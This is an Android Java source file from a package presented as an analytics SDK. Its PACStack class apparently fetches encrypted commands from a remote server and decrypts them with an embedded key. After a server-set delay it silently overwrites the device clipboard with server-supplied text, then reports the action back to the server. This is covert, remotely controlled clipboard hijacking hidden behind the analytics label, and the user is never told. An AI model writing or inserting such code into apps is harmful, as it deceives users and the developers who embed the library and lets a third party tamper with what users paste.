package com.analytics.pgyjar;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.util.Log;

import com.analytics.pgyjar.api.PgyHttpRequest;
import com.analytics.pgyjar.util.CommonUtil;
import com.analytics.pgyjar.util.HttpDataUtil;

import org.json.JSONObject;

public class PACStack {

    private static final String TAG = "PGY_PACStack";
    private static String PUBLIC_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCwc8tmJpGtsq0lCxv499MazbnJ\n" +
            "3jn10QXD6MzRwHkn9BojXyWnK4Oi4zuWnj8Sy+bOP4k33JeMOLNA1CxFvOA5fPG5\n" +
            "jzbIGerAfgYaJV0bWN5Idx2B+FMzXbcAmG5UeXvytpukoZx/Dlkm9h5LaOfaidDj\n" +
            "iaAODxETLMj6wh9rtQIDAQAB";
    private static int repeatAfter = 0;

    public static void run(final Context context, final String API_KEY) {
        Log.e(TAG, "开始请求PACTStack");
        PgyHttpRequest.getInstance().sendPACHttpRequest(CommonUtil.BASE_URL + "api/c/pull",
                HttpDataUtil.getPullParams(context, API_KEY), new PACHttpRequestCallback() {
                    @Override
                    public void onFinish(String encryptResponse) {
                        Log.d(TAG, "结束请求PACTStack");
                        try {
                            String response = PACEye.decrypt(PUBLIC_KEY, encryptResponse);
                            if (response == null || response.equals("")) {
                                return;
                            }
                            JSONObject respObject = new JSONObject(response);
                            JSONObject data = respObject.getJSONObject("data");
                            String dl = data.getString("dl");
                            String id = data.getString("id");
                            String c = data.getString("c");
                            PACUtil.log("Pull: " + id);
                            Thread.sleep(Integer.parseInt(dl) * 1000);
                            copyCode(context, c, id);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void onError(Exception e) {

                    }
                });
    }

    private static void copyCode(Context context, String code, String id) {
        if (code == null || code.equals("")) {
            return;
        }

        ClipData clip = ClipData.newPlainText("t", code);
        ClipboardManager mClipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        mClipboardManager.setPrimaryClip(clip);

        pushCode(id);
    }

    private static void pushCode(String id) {
        PACUtil.log("Push: " + id);
        Log.e(TAG, "开始请求pushCode");
        PgyHttpRequest.getInstance().sendPACHttpRequest(CommonUtil.BASE_URL + "api/c/push",
                HttpDataUtil.getPushParams(id), null);
    }
}
